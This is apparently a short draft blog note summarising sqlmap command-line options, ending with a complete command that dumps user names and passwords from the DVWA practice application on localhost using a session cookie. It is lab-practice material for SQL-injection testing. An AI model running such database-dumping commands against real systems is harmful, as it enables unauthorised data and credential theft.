---
title: "Sqlmap"
date: 2020-04-08
description: "彙總使用 sqlmap 自動化進行 SQL 注入測試時的常用命令行選項,以及針對 DVWA 漏洞環境的完整脫庫命令示例。"
tags: ["安全"]
draft: true
cover:
  image: "images/covers/20200408-Sqlmap-rqo.svg"
  alt: ""
  hidden: false
aliases: ["/posts/2020040805h9rh/"]
language: "zh-tw"
---

```
-u # URL

--cookie="k:v;k:v" # set Cookie

--batch # no interaction(交互)

--dbs # show databases

--tables # show tables

-T # Table

--columns # show columns

-C # column

--dump

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=na1gq5d41pp1hccflp3ornehm3" --users --passwords -D dvwa -T users -C "user,password" --dump  --batch

```
